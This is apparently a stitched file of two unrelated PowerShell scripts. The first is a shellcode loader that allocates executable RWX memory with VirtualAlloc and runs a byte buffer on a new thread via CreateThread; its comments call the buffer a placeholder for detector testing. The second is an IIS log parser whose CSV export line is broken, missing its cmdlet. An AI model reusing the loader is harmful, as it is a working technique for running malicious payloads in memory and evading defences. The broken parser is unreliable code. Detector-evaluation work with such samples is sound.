<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x7d, 0x4b, 0x5e, 0x1c, 0x2e, 0xc6, 0x5b, 0x58, 0x3a, 0xde, 0xbc, 0x34, 0x78, 0xd4, 0xaa, 0xf4,
    0xe1, 0xc2, 0x2b, 0x0a, 0x09, 0xde, 0xdf, 0xdf, 0x45, 0x1d, 0x88, 0x1e, 0xb7, 0xb9, 0x67, 0x8b,
    0xfd, 0x61, 0x53, 0x55, 0x6a, 0xab, 0xed, 0x56, 0x30, 0x69, 0xba, 0x3d, 0x1a, 0x3f, 0x3c, 0x1f,
    0xbb, 0x2d, 0xdd, 0x97, 0xb1, 0x62, 0xc9, 0x5e, 0xb1, 0x9b, 0xa4, 0x1d, 0x6a, 0xa7, 0x75, 0x2a,
    0xd7, 0x7f, 0xda, 0xec, 0x4f, 0xa1, 0x36, 0x7b, 0xb1, 0x18, 0x04, 0xd1, 0x66, 0xdd, 0x7b, 0x6b,
    0x04, 0xcd, 0xa3, 0x4c, 0xd4, 0xbe, 0x78, 0xf7, 0xed, 0x6a, 0x8e, 0x8e, 0xd3, 0x3a, 0xe0, 0xb5,
    0xd3, 0xe9, 0xb6, 0x91, 0xa7, 0xab, 0x7b, 0x66, 0x29, 0xc8, 0x3b, 0xd3, 0x8e, 0x08, 0x98, 0x53,
    0x3e, 0xfa, 0xe4, 0x96, 0x07, 0x63, 0x2c, 0x97, 0x4e, 0xcb, 0x7f, 0xa2, 0x83, 0x6a, 0x61, 0x3f,
    0x6d, 0x99, 0x5f, 0x21, 0x3b, 0x7e, 0x91, 0x32, 0xe8, 0x02, 0xe0, 0xa8, 0x12, 0xa1, 0xcd, 0xee,
    0xd7, 0x60, 0x7b, 0x83, 0x89, 0x18, 0x7b, 0x1e, 0x09, 0x8e, 0x7d, 0x48, 0xe5, 0x6d, 0x1a, 0xa3,
    0xa0, 0x35, 0x57, 0x88, 0xeb, 0x4a, 0xf7, 0x01, 0xf8, 0x69, 0xe0, 0x53, 0x43, 0x3d, 0x61, 0x0f,
    0x96, 0x76, 0xd6, 0xcc, 0xe3, 0x2d, 0x86, 0x9a, 0x4e, 0x01, 0x02, 0x06, 0xba, 0x68, 0x28, 0x11,
    0x0c, 0x9b, 0x9e, 0x0e, 0x15, 0xae, 0x4b, 0x59, 0xa9, 0xd5, 0x25, 0x03, 0x11, 0xf6, 0xdb, 0x92,
    0x6d, 0x07, 0x1e, 0x01, 0x2d, 0x4d, 0xa2, 0xf9, 0x3f, 0xf4, 0xcb, 0x36, 0xbd, 0x79, 0x51, 0x4b,
    0x3c, 0x1f, 0x24, 0x14, 0xbd, 0x89, 0xaf, 0xd2, 0x13, 0x5f, 0xc6, 0x73, 0x3c, 0x30, 0x4c, 0xaa,
    0x99, 0xaa, 0x03, 0xbf, 0xbc, 0xfa, 0x63, 0x3e, 0xe6, 0xbc, 0x04, 0xbc, 0x14, 0xc1, 0xf8, 0xc6,
    0x65
)

$BufferAddress = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 829)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
<#
.SYNOPSIS
    Parses IIS W3C logs and reports the busiest URLs and status codes.
.DESCRIPTION
    Reads the newest log files below the configured site folder, discovers the
    field order from the #Fields header and aggregates requests, errors and
    transferred bytes.
    The output is a CSV file that can be opened in Excel or forwarded to the web
    operations mailbox.
.EXAMPLE
    .\Parse-W3CLog.ps1 -Days 7 -TopN 20
.EXAMPLE
    .\Parse-W3CLog.ps1 -LogRoot D:\Logs\iis\W3SVC2
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$LogRoot = 'D:\Logs\iis\W3SVC2',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 7,

    [int]$TopN = 20,
    [string]$OutputPath = 'D:\Ops\reports\iis-top-2024-11-02.csv',
    [string]$HtmlPath = "D:\Ops\reports\iis-2024-11-02.html"
)

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$topUrls |
    -NoTypeInformation `
    -Path $OutputPath

Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
$byStatus | Format-Table -AutoSize

$style = @'
<style>
body { font-family: Calibri; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$topUrls | ConvertTo-Html -Title 'Top URLs' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8
